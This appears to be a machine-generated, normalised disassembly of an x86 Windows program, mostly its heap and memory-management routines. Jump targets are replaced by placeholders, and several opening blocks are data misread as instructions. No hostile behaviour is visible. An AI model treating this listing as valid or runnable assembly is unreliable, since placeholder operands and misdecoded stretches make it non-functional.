sub_4010aa
call [ eax + r-xdata ]
or al [ esi ]
push ebx
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + esi + 0x11 ] si
inc eax
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + 0x11 ] si
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
imul ebp [ esi + 0x67 ] r-xdata
or ecx [ edx ]
push edi
imul esp [ ebp + 0x53 ] 0x6e697274
int3
add [ eax ] al
inc esi
popfd
adc [ eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
sbb [ edx ] dl
inc eax
add [ ecx + 0x4011 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
adc al [ eax ]
or al 0x0
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax + 0x28004034 ] ah
pop ecx
inc eax
add [ ecx + ebx * 2 ] dh
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ ecx + ebx * 2 + 0x40 ] al
add [ edx + esi ] ah
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
je r-xdata
sar bh 0x25
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
push eax
adc [ eax ] eax
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_40117b
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403324
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_40119f
inc eax
add [ edi - 0x6effbfef ] al
adc [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
popfd
adc [ eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
sbb [ edx ] dl
inc eax
add [ ecx + 0x4011 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
adc al [ eax ]
or al 0x0
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax + 0x28004034 ] ah
pop ecx
inc eax
add [ ecx + ebx * 2 ] dh
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ ecx + ebx * 2 + 0x40 ] al
add [ edx + esi ] ah
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
sar bh 0x25
jb r-xdata
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_4013a8
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401368
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_401400
push ebx
push esi
mov esi edx
mov ebx eax
call sub_4013a8
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401448
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401430
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401430
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_401400
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_4014b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_401400
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401430
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40154c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_401400
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401378
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_4015b0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401378
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401378
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_401400
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401628
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401430
mov [ rw-data ] 0x1
sub_4016e0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401378
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_401774
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017f4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_40154c
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016e0
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401448
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401628
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401430
jmp r-xdata
sub_401884
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4015b0
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401448
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_4015b0
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401628
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401448
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016e0
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401628
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401430
jmp r-xdata
sub_4019a8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_401774
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401448
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401628
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_4014b8
jmp r-xdata
sub_401a34
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401aea
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401388
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013f8
mov eax rw-data
call sub_4013f8
mov eax rw-data
call sub_4013f8
push 0xff8
push 0x0
call sub_401368
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401390
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401af1
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401398
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401af8
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401bce
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401390
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4013f8
mov eax rw-data
call sub_4013f8
mov eax rw-data
call sub_4013f8
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_4013a0
retn
push rw-data
call sub_401398
sub_401bd8
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c3c
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c6c
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e40
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401cc0
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c9c
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401ce8
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bd8
add ebx esi
mov [ rw-data ] 0x6
sub_401d58
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bd8
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d90
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c3c
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_4019a8
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_4019a8
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c6c
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_4014b8
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401cc0
sub_401e40
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d90
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401ec8
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c9c
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401f14
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401ec8
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401448
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401ce8
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d58
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c6c
sub [ edi + 0x4 ] 0x4
sub_401fa0
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017f4
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f14
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fcc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_401884
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f14
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_402000
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_40202c
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bd8
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e40
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401fa0
test al al
jne r-xdata
mov eax esi
call sub_402000
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_402120
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a34
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_40229c
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401390
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_40202c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401398
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403ad0
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403ad0
jmp r-xdata
sub_4022b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_402442
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a34
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401390
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
